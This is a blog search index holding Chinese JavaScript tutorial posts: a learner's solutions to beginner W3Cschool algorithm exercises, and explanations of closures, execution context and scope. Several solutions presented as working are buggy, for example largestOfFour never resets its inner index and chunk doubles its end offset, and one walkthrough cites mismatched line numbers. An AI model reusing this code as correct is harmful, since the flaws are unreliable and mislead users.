<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[W3Cschool——初级脚本算法题]]></title>
      <url>%2FJS-initial-train%2F</url>
      <content type="text"><![CDATA[前言偶然看到W3Cschool上有个编程挑战，里面的题目前是面向前端方面的，也有一些算法和数据结构的题在，我花了两天的时间把16道初级脚本算法的题完成并做一个思路分享，从中有一定的收获，题目从实际出发，需要灵活运用各个JS对象的属性和方法才能完成，反复的加深了我对这些方法的认识和理解以及运用，也锻炼了我的逻辑思维能力。做这些题确实很有帮助，以后有时间每天再去做一两道中级的，最后再整理出来把我的解法和思路与大家共享。 翻转字符串先把字符串转化成数组，再借助数组的reverse方法翻转数组顺序，最后把数组转化成字符串。你的结果必须得是一个字符串 123456789function reverseString(str) &#123; var arr = []; arr = str.split(&quot;&quot;); arr.reverse(); str = arr.join(&quot;&quot;); return str; &#125; console.log(reverseString(&quot;hello&quot;)); 知识点： split() 把字符串分割为字符串数组。 reverse() 反转数组的元素顺序。 toString() 把数组转换为字符串，并返回结果。 阶乘算法挑战计算一个整数的阶乘如果用字母n来代表一个整数，阶乘代表着所有小于或等于n的整数的乘积。12345678910111213141516171819// //for循环 // function factorialize(num) &#123; // var i = 1 // var sum = 1; // for (; i &lt; num + 1; i++) &#123; // sum = sum * i; // &#125; // return sum; // &#125; // 递归实现 function factorialize(num) &#123; if (num == 1 || num == 0) return 1; else &#123; return factorialize(num - 1) * num; &#125; &#125; console.log(factorialize(0)); 回文算法挑战如果一个字符串忽略标点符号、大小写和空格，正着读和反着读一模一样，那么这个字符串就是palindrome(回文)。 你需要去掉字符串多余的标点符号和空格 然后把字符串转化成小写来验证此字符串是否为回文。 1234567891011121314151617181920212223242526272829function palindrome(str) &#123; //传入字符串处理 var newstr = str.replace(/[^0-9a-z]/gi, &quot;&quot;); newstr = newstr.toLowerCase(); // // 方法一 // //转换成数组并进行反向排序 // var arr = newstr.split(&quot;&quot;); // arr.reverse(); // //把排序后的转换为字符串进行全等判断 // arr = arr.join(&quot;&quot;); // if (newstr === arr) &#123; // return true; // &#125; else &#123; // return false; // &#125; //方法二 从字符串头部和尾部，逐次向中间检测 for (var i = 0, j = newstr.length - 1; i &lt; j; i++, j--) &#123; //这里注意下，for循环内部只判断不符合要求的， //如果循环后都没返回false就在for外部返回true，不要在内部直接返回true或提前出来 if (newstr.charAt(i) !== newstr.charAt(j)) &#123; return false; &#125; &#125; return true; &#125; console.log(palindrome(&quot;assa&quot;)); 寻找最长的单词算法挑战找到提供的句子中最长的单词，并计算它的长度。函数的返回值应该是一个数字。 1234567891011121314151617181920212223242526272829function findLongestWord(str) &#123; var arr = str.split(&quot; &quot;), i = 0, lengthNum, maxLengthNum = 0; // var index = i + 1; //方法一：复杂化方法：冒泡排序解法（直接第一个想到就是这个，就顺着来做了，发现复杂化， //只需要把数组长度和最大值取出来做比较就行了） // for (; i &lt; arr.length - 1; i++) &#123; // for (; index &lt; arr.length; index++) &#123; // if (arr[i].length &lt; arr[index].length) &#123; // var temp = arr[i]; // arr[i] = arr[index]; // arr[index] = temp; // &#125; // &#125; // &#125; // return arr[0].length; //方法二：取出数组长度值与历史最大值比较，第一个默认为起始最大值 for (; i &lt; arr.length; i++) &#123; lengthNum = arr[i].length; if (lengthNum &gt; maxLengthNum) &#123; maxLengthNum = lengthNum; &#125; &#125; return maxLengthNum; &#125; findLongestWord(&quot;The quick brown fox jumped over the lazy dog&quot;); 设置首字母大写算法挑战确保字符串的每个单词首字母都大写，其余部分小写。 1234567891011121314151617181920212223242526272829303132333435//方法一：复杂化，没有使用charAt+replace、map() + slice() // function titleCase(str) &#123; // var arr = str.toLowerCase().split(&quot; &quot;); // var newArr = new Array(); // var i = 0; // for (; i &lt; arr.length; i++) &#123; // newArr[i] = arr[i].split(&quot;&quot;); // newArr[i][0] = newArr[i][0].toUpperCase(); // newArr[i] = newArr[i].join(&quot;&quot;); // &#125; // arr = newArr.join(&quot; &quot;); // console.log(arr); // return arr; // &#125; //方法二：简单化用replace替换首字母大写 // function titleCase(str) &#123; // var arr = str.toLowerCase().split(&quot; &quot;); // var i = 0; // for (; i &lt; arr.length; i++) &#123; // var Up = arr[i].charAt(0).toUpperCase(); // arr[i] = arr[i].replace(arr[i].charAt(0), Up); // &#125; // return arr.join(&quot; &quot;); // &#125; //方法三:map() + replace() function titleCase(str) &#123; var arr = str.toLowerCase().split(&quot; &quot;).map(function(word) &#123; return (word.charAt(0).toUpperCase() + word.slice(1)); &#125;).join(&quot; &quot;); console.log(arr); return arr; &#125; titleCase(&quot;I&apos;m a little tea pot&quot;); 寻找数组中的最大值算法挑战右边大数组中包含了4个小数组，分别找到每个小数组中的最大值，然后把它们串联起来，形成一个新数组。 12345678910111213141516171819202122function largestOfFour(arr) &#123; var i = 0, j = 0, maxArr = []; for (; i &lt; arr.length; i++) &#123; var max = 0; //内部循环后，比较值要清空一次。 for (; j &lt; arr[i].length; j++) &#123; if (arr[i][j] &gt; max) &#123; max = arr[i][j]; &#125; &#125; maxArr.push(max); &#125; console.log(maxArr); return maxArr; &#125; largestOfFour([ [13, 27, 18, 26], [4, 5, 1, 3], [32, 35, 37, 39], [1000, 1001, 857, 1] ]); 确认末尾字符算法挑战检查一个字符串(str)是否以指定的字符串(target)结尾。 123456789101112//方法一：使用lastIndexOf从最后开始查找，并返回对应的起始位置到其索引，再做比较，indexOf也可实现返回索引 // function confirmEnding(str, target) &#123; // var index = str.lastIndexOf(target); // return index == str.length - target.length; // &#125; //方法二：使用substr抽取出字符，用负数来实现从末尾抽对应的查询字符的长度 //如果查找的字符实在最后出现，则抽取出来的应该和需要查找的一样，同理slice也可以实现提取 function confirmEnding(str, target) &#123; var endingPart = str.substr(-(target.length)); return target === endingPart; &#125; console.log(confirmEnding(&quot;Walking on water and developing software from a are easy if both are frozen specification&quot;, &quot;specification&quot;)); 重复操作算法挑战重复一个指定的字符串 num次，如果num是一个负数则返回一个空字符串。 1234567891011121314function repeat(str, num) &#123; var temp = str, i = 0; if (num &lt; 0) &#123; return &quot;&quot;; &#125; else &#123; for (; i &lt; num - 1; i++) &#123; str = str.concat(temp); &#125; &#125; return str; &#125; console.log(repeat(&quot;abc&quot;, 3)); 字符串截取算法挑战如果字符串的长度比指定的参数num长，则把多余的部分用…来表示。切记，插入到字符串尾部的三个点号也会计入字符串的长度。但是，如果指定的参数num小于或等于3，则添加的三个点号不会计入字符串的长度。12345678910111213141516171819202122function truncate(str, num) &#123; var more = &quot;...&quot;; // Clear out that junk in your trunk if (str.length &lt;= num) &#123; if (num &lt;= 3) &#123; var newStr = str.substr(0, num); str = newStr.concat(more); &#125; else return str; &#125; else &#123; if (num &lt;= 3) &#123; var newStr = str.substr(0, num); str = newStr.concat(more); &#125; else &#123; var newStr = str.substr(0, num - 3); str = newStr.concat(more); &#125; &#125; return str;&#125;console.log(truncate(&quot;Absolutely Longer&quot;, 2)); 数组分割算法挑战猴子吃香蕉可是掰成好几段来吃哦！把一个数组arr按照指定的数组大小size分割成若干个数组块。例如:chunk([1,2,3,4],2)=[[1,2],[3,4]];chunk([1,2,3,4,5],2)=[[1,2],[3,4],[5]]; 12345678910111213141516function chunk(arr, size) &#123; // Break it up. var newArr = []; var index = 0, end = size, i = 0; var count = arr.length / size; console.log(count); for (; i &lt; count; index += size) &#123; newArr[i] = arr.slice(index, end); end = end + end; i++; &#125; return newArr;&#125; console.log(chunk([0, 1, 2, 3, 4, 5, 6], 3)); 数组截断算法挑战返回一个数组被截断n个元素后还剩余的元素，截断从索引0开始。12345678 function slasher(arr, howMany) &#123; if (arr.length &gt; howMany) &#123; arr = arr.slice(-(arr.length - howMany)); return arr; &#125; else return [];&#125;console.log(slasher([1, 2, 3], 4)); 数组查询算法挑战蛤蟆可以吃队友，也可以吃对手。如果数组第一个字符串元素包含了第二个字符串元素的所有字符，函数返回true。举例，[“hello”, “Hello”]应该返回true，因为在忽略大小写的情况下，第二个字符串的所有字符都可以在第一个字符串找到。[“hello”, “hey”]应该返回false，因为字符串”hello”并不包含字符”y”。[“Alien”, “line”]应该返回true，因为”line”中所有字符都可以在”Alien”找到。 123456789101112131415161718192021function mutation(arr) &#123; var count = 0, newArr, i = 0; newArr = arr.join(&quot; &quot;); newArr = newArr.toLowerCase().split(&quot; &quot;); newArr[0] = newArr[0].split(&quot;&quot;); newArr[1] = newArr[1].split(&quot;&quot;); console.log(newArr); for (; i &lt; newArr[1].length; i++) &#123; var index = 0; for (; index &lt; newArr[0].length; index++) &#123; if (newArr[1][i] == newArr[0][index]) &#123; count++; index = newArr[0].length; &#125; &#125; console.log(count); &#125; return count === arr[1].length; &#125; console.log(mutation([&quot;floor&quot;, &quot;for&quot;])); 删除数组中特定值算法挑战删除数组中的所有假值。在JavaScript中，假值有false、null、0、””、undefined 和 NaN。12345678910111213function bouncer(arr) &#123; var index = 0; // Don&apos;t show a false ID to this bouncer. for (; index &lt; arr.length; index++) &#123; if (!arr[index]) &#123; arr.splice(index, 1); //保证删除数组元素后，索引不跳过下一个 index--; &#125; &#125; return arr; &#125; console.log(bouncer([7, &quot;ate&quot;, &quot;&quot;, false, 9])); 去除数组中任意多个值算法挑战实现一个摧毁(destroyer)函数，第一个参数是待摧毁的数组，其余的参数是待摧毁的值。123456789101112131415function destroyer(arr, del1, del2, del3) &#123; var newDel = [del1, del2, del3], index = 0; for (; index &lt; newDel.length; index++) &#123; var i = 0; for (; i &lt; arr.length; i++) &#123; if (arr[i] == newDel[index]) &#123; arr.splice(i, 1); i--; &#125; &#125; &#125; return arr; &#125; console.log(destroyer([1, 2, 3, 1, 2, 3], 2, 3)); 数组排序并插入值算法挑战先给数组排序，然后找到指定的值在数组的位置，最后返回位置对应的索引。举例：where([1,2,3,4], 1.5) 应该返回 1。因为1.5插入到数组[1,2,3,4]后变成[1,1.5,2,3,4]，而1.5对应的索引值就是1。同理，where([20,3,5], 19) 应该返回 2。因为数组会先排序为 [3,5,20]，19插入到数组[3,5,20]后变成[3,5,19,20]，而19对应的索引值就是2。123456789101112131415161718192021function where(arr, num) &#123; arr.push(num); var i = 0, index = 0; for (; i &lt; arr.length - 1; i++) &#123; var j = i + 1; for (; j &lt; arr.length; j++) &#123; if (arr[i] &gt; arr[j]) &#123; var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; &#125; for (; index &lt; arr.length; index++) &#123; if (arr[index] == num) &#123; return index; &#125; &#125; &#125; console.log(where([2, 20, 10], 19)); 位移密码算法挑战下面我们来介绍风靡全球的凯撒密码Caesar cipher，又叫移位密码。移位密码也就是密码中的字母会按照指定的数量来做移位。一个常见的案例就是ROT13密码，字母会移位13个位置。由’A’ ↔ ‘N’, ‘B’ ↔’O’，以此类推。写一个ROT13函数，实现输入加密字符串，输出解密字符串。所有的字母都是大写，不要转化任何非字母形式的字符(例如：空格，标点符号)，遇到这些特殊字符，跳过它们。 12345678910111213141516171819function rot13(str) &#123; // LBH QVQ VG! var arr = []; for (var index = 0; index &lt; str.length; index++) &#123; arr[index] = str.charCodeAt(index); if (arr[index] &gt;= 65 &amp;&amp; arr[index] &lt;= 77) &#123; arr[index] += 13; &#125; //字母为26个当在字母末13个位，右移13位不是字母，应该进行左移、保证在字母26位里。 else if (arr[index] &gt; 77 &amp;&amp; arr[index] &lt; 91) arr[index] -= 13; &#125; console.log(arr); for (var i = 0; i &lt; arr.length; i++) &#123; arr[i] = String.fromCharCode(arr[i]); &#125; return arr.join(&quot;&quot;);&#125;// Change the inputs below to testconsole.log(rot13(&quot;SERR PBQR PNZC&quot;)); End大家如果有更好的方法或者其他解法欢迎补充和交流，可与我直接联系。如需转载请注明出处，谢谢！！！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JavaScript高级程序设计——闭包]]></title>
      <url>%2Fjs-closure%2F</url>
      <content type="text"><![CDATA[前言有很多人搞不清匿名函数和闭包这两个概念，经常混用。闭包是指有权访问另一个函数作用域中的变量的函数。匿名函数就是没有实际名字的函数。 闭包概念闭包，其实是一种语言特性，它是指的是程序设计语言中，允许将函数看作对象，然后能像在对象中的操作搬在函数中定义实例（局部）变量，而这些变量能在函数中保存到函数的实例对象销毁为止，其它代码块能通过某种方式获取这些实例（局部）变量的值并进行应用扩展。 条件闭包是允许函数访问局部作用域之外的数据。即使外部函数已经退出，外部函数的变量仍可以被内部函数访问到。 因此闭包的实现需要三个条件： 内部函数实用了外部函数的变量外部函数已经退出内部函数可以访问 12345678910111213function a() &#123; var x = 0; return function(y) &#123; x = x + y; // return x; console.log(x); &#125; &#125; var b = a(); b(1); //1 b(1); //2 上述代码在执行的时候，b得到的是闭包对象的引用，虽然a执行完毕后，但是a的活动对象由于闭包的存在并没有被销毁，在执行b(1)的时候，仍然访问到了x变量，并将其加1，若再执行b(1)，则x是2，因为闭包的引用b并没有消除。（后面会解释，闭包返回了函数，函数可以创建独立的作用域） 闭包，其实就是指程序语言中能让代码调用已运行的函数中所定义的局部变量。 但是你只需要知道应用的两种情况即可——函数作为返回值，函数作为参数传递。 12345678910function fn() &#123; var max = 10; return function bar(x) &#123; if (x &gt; max) &#123; console.log(x); &#125; &#125;; &#125; var f1 = fn(); f1(15); 如上代码，bar函数作为返回值，赋值给f1变量。执行f1(15)时，用到了fn作用域下的max变量的值。至于如何跨作用域取值，可以参考上一篇文章。 12345678910var max = 10, fn = function(x) &#123; if (x &gt; max) &#123; console.log(x); //15 &#125; &#125;; (function(f) &#123; var max = 100; f(15); &#125;)(fn); 如上代码中，fn函数作为一个参数被传递进入另一个函数，赋值给f参数。执行f(15)时，max变量的取值是10，而不是100。 上一篇讲到自由变量跨作用域取值时，曾经强调过：要去创建这个函数的作用域取值，而不是“父作用域”。理解了这一点，以上两端代码中，自由变量如何取值应该比较简单. 另外，讲到闭包，除了结合着作用域之外，还需要结合着执行上下文栈来说一下。 在前面讲执行上下文栈时，我们提到当一个函数被调用完成之后，其执行上下文环境将被销毁，其中的变量也会被同时销毁。 有些情况下，函数调用完成之后，其执行上下文环境不会接着被销毁。这就是需要理解闭包的核心内容。 可以拿本文的之前代码（只做注释修改）来分析一下。 1234567891011121//全局作用域2 function fn() &#123;3 var max = 10;4 // fn作用域5 return function bar(x) &#123;6 if (x &gt; max) &#123;7 console.log(x);8 &#125;9 &#125;; //bar作用域10 &#125;11 var f1 = fn();12 f1(15); 全局作用域为：代码1-12行；fn作用域为：代码2-10行；bar作用域为：代码5-9行。 举例第一步，代码执行前生成全局上下文环境，并在执行时对其中的变量进行赋值。此时全局上下文环境是活动状态。 第二步，执行第17行代码时，调用fn()，产生fn()执行上下文环境，压栈，并设置为活动状态。 第三步，执行完第17行，fn()调用完成。按理说应该销毁掉fn()的执行上下文环境，但是这里不能这么做。注意，重点来了： 因为执行fn()时，返回的是一个函数。函数的特别之处在于可以创建一个独立的作用域。而正巧合的是，返回的这个函数体中，还有一个自由变量max要引用fn作用域下的fn()上下文环境中的max。因此，这个max不能被销毁，销毁了之后bar函数中的max就找不到值了。 因此，这里的fn()上下文环境不能被销毁，还依然存在与执行上下文栈中。 ——即，执行到第18行时，全局上下文环境将变为活动状态，但是fn()上下文环境依然会在执行上下文栈中。另外，执行完第18行，全局上下文环境中的max被赋值为100。如下图：第四步，执行到第20行，执行f1(15)，即执行bar(15)，创建bar(15)上下文环境，并将其设置为活动状态。执行bar(15)时，max是自由变量，需要向创建bar函数的作用域中查找，找到了max的值为10。这个过程在作用域链一节已经讲过。 这里的重点就在于，创建bar函数是在执行fn()时创建的。fn()早就执行结束了，但是fn()执行上下文环境还存在与栈中，因此bar(15)时，max可以查找到。如果fn()上下文环境销毁了，那么max就找不到了。 总结：使用闭包会增加内容开销 第五步，执行完20行就是上下文环境的销毁过程，这里就不再赘述了。 闭包与变量概念 闭包只能取得包含函数中任何变量的最后一个值,闭包所保存的是整个变量对象，而不是某个特殊变量。 例子 123456789101112131415161718function createFunctions() &#123; var result = new Array(); for (var i = 0; i &lt; 10; i++) &#123; result[i] = function() &#123; return i; &#125;; &#125; return result; &#125; var funcs = createFunctions(); //每个函数都输出10 for (var i = 0; i &lt; funcs.length; i++) &#123; document.write(funcs[i]() + &quot;&lt;br /&gt;&quot;); &#125; 总结：每个函数的作用域链中都保存着createFunctions()函数的活动对象，所以它们引用的都是同一个变量i。当createFunctions()函数返回后，变量i的值为10。 我们可以通过创建另一个匿名函数强制让闭包的行为符合预期。 1234567891011121314151617181920function createFunctions() &#123; var result = new Array(); for (var i = 0; i &lt; 10; i++) &#123; result[i] = function(x) &#123; return function() &#123; return x; &#125;; &#125;(i); &#125; return result; &#125; var funcs = createFunctions(); //循环输出0-10 for (var i = 0; i &lt; funcs.length; i++) &#123; document.write(funcs[i]() + &quot;&lt;br /&gt;&quot;); &#125; 总结：没有直接把闭包赋值给数组，而是定义了一个匿名函数，并通过立即执行该匿名函数的结果赋值给数组，并带了for循环的参数i进去，让x能找到传入的参数值为0-10，这就解释了函数参数是按值传递的，所以会将变量i的当前值复制给参数x。而这个匿名函数内部又创建并返回了一个访问x的闭包。这样以来result数组中的每个函数都有自己x变量的一个副本，所以会符合我们的预期输出不同的值。 函数按值传递函数传参就两个类型，基本类型和引用类型，大家纠结的都是引用类型的传递。 引用类型作为参数传入函数，传的是个地址值，或者指针值，不是那个引用类型本身，它还好好的呆在堆内存呢。赋值给argument的同样是地址值或者指针。所以说是value值传递一点没错，传的是个地址值。通过两个例子看懂就行了。 例子1： 1234567891011function setName(obj) &#123;obj.name = &apos;aaa&apos;;var obj = new Object(); // 如果是按引用传递的,此处传参进来obj应该被重新引用新的内存单元obj.name = &apos;ccc&apos;;return obj;&#125;var person = new Object();person.name = &apos;bbb&apos;;var newPerson = setName(person);console.log(person.name + &apos; | &apos; + newPerson.name); // aaa | ccc 从结果看，并没有显示两个’ccc’。这里是函数内部重写了obj，重写的obj是一个局部对象。当函数执行完后，立即被销毁。 引用值：对象变量它里面的值是这个对象在堆内存中的内存地址。因此如果按引用传递，它传递的值也就是这个内存地址。那么var obj = new Object();会重新给obj分配一个地址，比如是0x321了，那么它就不在指向有name = ‘aaa’;属性的内存单元了。相当于把实参obj和形参obj的地址都改了，那么最终就是输出两个ccc了。 例子2 12345678910111213141516var a = &#123;num:&apos;1&apos;&#125;;var b = &#123;num:&apos;2&apos;&#125;;function change(obj)&#123;obj.num = &apos;3&apos;;obj = b;return obj.num;&#125;var result = change(a);console.log(result + &apos; | &apos; + a.num); // 2 | 3 首先把a的值传到change函数内，obj.num = ‘3’;后a.name被修改为3;a的地址被换成b的地址;返回此时的a中a.num。 闭包中使用this对象概念this对象是在运行时基于函数的执行环境绑定的：全局函数中，this等于window;当函数被作用某个对象的方法调用时，this等于那个对象。 但在匿名函数中，由于匿名函数的执行环境具有全局性，因此this对象通常指向window(在通过call或apply函数改变函数执行环境的情况下，会指向其他对象)。 12345678910111213var name = &quot;The Window&quot;; var object = &#123; name : &quot;My Object&quot;, getNameFunc : function()&#123; return function()&#123; return this.name; &#125;; &#125; &#125;; alert(object.getNameFunc()()); //&quot;The Window&quot; 通过修改把作用域中的this对象保存在一个闭包能够访问到的变量里，就可以让闭包访问该对象了。如下代码： 1234567891011121314var name = &quot;The Window&quot;; var object = &#123; name : &quot;My Object&quot;, getNameFunc : function()&#123; var that = this; return function()&#123; return that.name; &#125;; &#125; &#125;; alert(object.getNameFunc()()); //&quot;MyObject&quot; 变量声明提前1234567var scope=&quot;global&quot;; function scopeTest() &#123; console.log(scope); var scope=&quot;local&quot;; &#125; scopeTest(); //undefined 此处的输出是undefined，并没有报错，这是因为在前面我们提到的函数内的声明在函数体内始终可见，上面的函数等效于： 1234567var scope=&quot;global&quot;; function scopeTest() &#123; var scope; console.log(scope); scope=&quot;local&quot;; &#125; scopeTest(); //undefined 注意，如果忘记var，那么变量就被声明为全局变量了。结果就是global 没有块级作用域和其他我们常用的语言不同，在Javascript中没有块级作用域：123456789101112function scopeTest() &#123; var scope = &#123;&#125;; if (scope instanceof Object) &#123; var j = 1; for (var i = 0; i &lt; 10; i++) &#123; console.log(i); //输出0-9 &#125; console.log(i); //输出10 &#125; console.log(j); //输出1 &#125; scopeTest(); 在javascript中变量的作用范围是函数级的，即在函数中所有的变量在整个函数中都有定义，这也带来了一些我们稍不注意就会碰到的“潜规则”： 123456var scope = &quot;hello&quot;; function scopeTest() &#123; console.log(scope);//① var scope = &quot;no&quot;; console.log(scope);//② &#125; 在①处输出的值竟然是undefined，简直丧心病狂啊，我们已经定义了全局变量的值啊，这地方不应该为hello吗？其实，上面的代码等效于： 1234567var scope = &quot;hello&quot;; function scopeTest() &#123; var scope; console.log(scope);//① scope = &quot;no&quot;; console.log(scope);//② &#125; 声明提前、全局变量优先级低于局部变量，根据这两条规则就不难理解为什么输出undefined了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JavaScript高级程序设计——上下文环境和作用域]]></title>
      <url>%2Fjs-context%2F</url>
      <content type="text"><![CDATA[前言此文章为加深对JS中重要概念进行理解，不建议没有任何JS基础的人看，只为加深对概念理解通过实际的例子，而不是看书以为自己读懂了，可能几天后就忘了，主要是为了理解核心概念，以及对重难点解释。 引言此篇在JS红宝书里其实没有特别来讲，只是穿插在其他的章节提及而已，内容不难，只为加深印象。 执行上下文函数表达式和函数声明1234567891011121.console.log(a); // ReferenceError: a is not defined// ReferenceError（引用错误）对象表明一个不存在的变量被引用。2.console.log(a); // undefinedvar a;3. console.log(a); // undefined var a = 10;4.var a = 10;console.log(a); // 10 第一句报错，a未定义，很正常。第二句、第三句输出都是undefined，说明浏览器在执行console.log(a)时，已经知道了a是undefined，但却不知道a是10（第三句中）。 在一段js代码拿过来真正一句一句运行之前，浏览器已经做了一些“准备工作”，其中就包括对变量的声明，而不是赋值。变量赋值是在赋值语句执行的时候进行的。可用下图模拟： 接下来的这段代码需要注意代码注释中的两个名词——“函数表达式”和“函数声明”。虽然两者都很常用，但是这两者在“准备工作”时，却是两种待遇。 “准备工作”12345671.console.log(f1); //function f1()function f1() &#123;&#125;2.console.log(f2); //undefinedvar f2 = function f2() &#123;&#125; 看以上代码。“函数声明”时我们看到了第二种情况，而“函数表达式”时我们看到了第一种情况。 在“准备工作”中，对待函数表达式就像对待“ var a = 10 ”这样的变量一样，只是声明。而对待函数声明时，却把函数整个赋值了。 总结一下，在“准备工作”中完成了哪些工作： 变量、函数表达式——变量声明，默认赋值为undefined； this——赋值； 函数声明——把函数整个赋值； 这三种数据的准备情况我们称之为“执行上下文”或者“执行上下文环境”。 12345function fn(x) &#123; console.log(arguments); //Arguments &#123; 0: 10, 等 2 项… &#125; console.log(x); //10 &#125; fn(10); 以上代码展示了在函数体的语句执行之前，arguments变量和函数的参数都已经被赋值。从这里可以看出，函数每被调用一次，都会产生一个新的执行上下文环境。因为不同的调用可能就会有不同的参数。 另外一点不同在于，函数在定义的时候（不是调用的时候），就已经确定了函数体内部自由变量的作用域。用一个例子说明一下： 123456789101112var a = 10;function fn() &#123; console.log(a); //a是自由变量 //函数创建时，就确定了a要取值的作用域&#125;function bar() &#123; var a = 20; fn(); //打印10不是20&#125;bar(fn); //10 给执行上下文环境下一个通俗的定义——在执行代码之前，把将要用到的所有的变量都事先拿出来，有的直接赋值了，有的先用undefined占个空。 执行上下文栈执行全局代码时，会产生一个执行上下文环境，每次调用函数都又会产生执行上下文环境。当函数调用完成时，这个上下文环境以及其中的数据都会被消除，再重新回到全局上下文环境。处于活动状态的执行上下文环境只有一个。 其实这是一个压栈出栈的过程——执行上下文栈。 123456789101112131401 var a = 10, //1.进入全局上下文环境2 fn,3 bar = function(x) &#123;4 var b = 5;5 fn(x + b); //3.进入fn函数上下文环境6 &#125;;78 fn = function(y) &#123;9 var c = 5;10 console.log(y + c);11 &#125;1213 bar(10); //2.进入bar函数上下文环境 在执行代码之前，首先将创建全局上下文环境。 全局 上下文环境 a undefined fn undefined bar undefined this window 然后是代码执行。代码执行到第12行之前，上下文环境中的变量都在执行过程中被赋值。 全局 上下文环境 a 10 fn function bar function this window 执行到第13行，调用bar函数。 跳转到bar函数内部，执行函数体语句之前，会创建一个新的执行上下文环境。全局 | 上下文环境—|—b | undefinedx | 10arguments | [10]this | window 并将这个执行上下文环境压栈，设置为活动状态。 执行到第5行，又调用了fn函数。进入fn函数，在执行函数体语句之前，会创建fn函数的执行上下文环境，并压栈，设置为活动状态。 待第5行执行完毕，即fn函数执行完毕后，此次调用fn所生成的上下文环境出栈，并且被销毁（已经用完了，就要及时销毁，释放内存）。 同理，待第13行执行完毕，即bar函数执行完毕后，调用bar函数所生成的上下文环境出栈，并且被销毁（已经用完了，就要及时销毁，释放内存）。 好了，给大家介绍了一段简短代码的执行上下文环境的变化过程，一个完整的闭环。其中上下文环境的变量赋值过程我省略了许多，因为那些并不难，一看就知道。 作用域基础认识 “javascript没有块级作用域”。所谓“块”，就是大括号“｛｝”中间的语句。 比如一个if语句 12345var i = 10; if (i &gt; 1) &#123; var name = &quot;yzh&quot;; &#125; console.log(name); //yzh for语句1234for (var i = 0; i &lt; 10; i++) &#123; &#125; console.log(i); //10 我们在编写代码的时候，不要在“块”里面声明变量，要在代码的一开始就声明好了。以避免发生歧义 12345var i; for (i = 0; i &lt; 10; i++) &#123; &#125; console.log(i); 你光知道“javascript没有块级作用域”是完全不够的，你需要知道的是——javascript除了全局作用域之外，只有函数可以创建的作用域。 我们在声明变量时，全局代码要在代码前端声明，函数中要在函数体一开始就声明好。除了这两个地方，其他地方都不要出现变量声明。而且建议用“单var”形式 概念 如上图，全局代码和fn、bar两个函数都会形成一个作用域。而且，作用域有上下级的关系，上下级关系的确定就看函数是在哪个作用域下创建的。例如，fn作用域下创建了bar函数，那么“fn作用域”就是“bar作用域”的上级。 作用域最大的用处就是隔离变量，不同作用域下同名变量不会有冲突 例如以上代码中，三个作用域下都声明了“a”这个变量，但是他们不会有冲突。各自的作用域下，用各自的“a”。 作用域和上下文环境 如上图，我们在上文中已经介绍了，除了全局作用域之外 每个函数都会创建自己的作用域，作用域在函数定义时就已经确定了。而不是在函数调用时确定。 下面我们将按照程序执行的顺序，一步一步把各个上下文环境加上 第一步，在加载程序时，已经确定了全局上下文环境，并随着程序的执行而对变量就行赋值。 第二步，程序执行到第27行，调用fn(10)，此时生成此次调用fn函数时的上下文环境，压栈，并将此上下文环境设置为活动状态。 第三步，执行到第23行时，调用bar(100)，生成此次调用的上下文环境，压栈，并设置为活动状态。 第四步，执行完第23行，bar(100)调用完成。则bar(100)上下文环境被销毁。接着执行第24行，调用bar(200)，则又生成bar(200)的上下文环境，压栈，设置为活动状态。 第五步，执行完第24行，则bar(200)调用结束，其上下文环境被销毁。此时会回到fn(10)上下文环境，变为活动状态。 第六步，执行完第27行代码，fn(10)执行完成之后，fn(10)上下文环境被销毁，全局上下文环境又回到活动状态。 最后我们可以把以上这几个图片连接起来看看。 作用域只是一个“地盘”，一个抽象的概念，其中没有变量。要通过作用域对应的执行上下文环境来获取变量的值。 同一个作用域下，不同的调用会产生不同的执行上下文环境，继而产生不同的变量的值。所以，作用域中变量的值是在执行过程中产生的确定的，而作用域却是在函数创建时就确定了。 如果要查找一个作用域下某个变量的值，就需要找到这个作用域对应的执行上下文环境，再在其中寻找变量的值。 自由变量在A作用域中使用的变量x，却没有在A作用域中声明（即在其他作用域中声明的），对于A作用域来说，x就是一个自由变量。例： 1234567var x = 50; function fn() &#123; var b = 20; console.log(x + b); &#125; fn(); //70 在调用fn()函数时，函数体中第6行。取b的值就直接可以在fn作用域中取，因为b就是在这里定义的。而取x的值时，就需要到另一个作用域中取。到哪个作用域中取呢？有人说过要到父作用域中取，其实有时候这种解释会产生歧义例如：12345678910111213var x = 50; function fn() &#123; console.log(x); &#125; function show(f) &#123; var x = 20; (function() &#123; f(); //50 不是20 &#125;)(); &#125; show(fn); //50 不是20 不要在用以上说法了。相比而言，用这句话描述会更加贴切——要到创建这个函数的那个作用域中取值——是“创建”，而不是“调用”，切记切记——其实这就是所谓的“静态作用域”。 对于本文第一段代码，在fn函数中，取自由变量x的值时，要到哪个作用域中取？——要到创建fn函数的那个作用域中取——无论fn函数将在哪里调用。 上面描述的只是跨一步作用域去寻找。 如果跨了一步，还没找到呢？——接着跨！——一直跨到全局作用域为止。要是在全局作用域中都没有找到，那就是真的没有了。 这个一步一步“跨”的路线，我们称之为——作用域链。 123456789101112131415161718192021var color = &quot;blue&quot;; function changeColor() &#123; var anotherColor = &quot;red&quot;; function swapColors() &#123; var tempColor = anotherColor; anotherColor = color; color = tempColor; //这里可以访问color,anotherColor和tempColor &#125; //这里可以访问color和anotherColor,但不能访问tempColor swapColors(); &#125; changeColor(); //注释后alert显示为blue //这里只能访问color alert(&quot;Color is now &quot; + color); //red 以上代码共涉及3个执行环境：全局环境、changeColor()的局部环境和swapColors()的局部环境。 全局环境 changeColor()的局部环境 swapColors()的局部环境 变量color 变量anotherColor 变量tempColor 函数changeColor() 函数swapColors() 内部环境可以通过作用域链访问所有的外部环境，但外部环境不能访问内部环境中的任何变量和函数。 每个环境都可以向上搜索作用域链，以查询变量和函数名；但任何环境都不能通过向下搜索作用域链而进入另一个执行环境。 最后这个例子是从书上找到的，比较经典和简单。 End后面将总结一篇关于闭包的文章 参考文章 深入理解javascript原型和闭包——执行上下文栈 深入理解javascript原型和闭包-作用域和上下文环境]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JavaScript高级程序设计——this]]></title>
      <url>%2Fjs-this%2F</url>
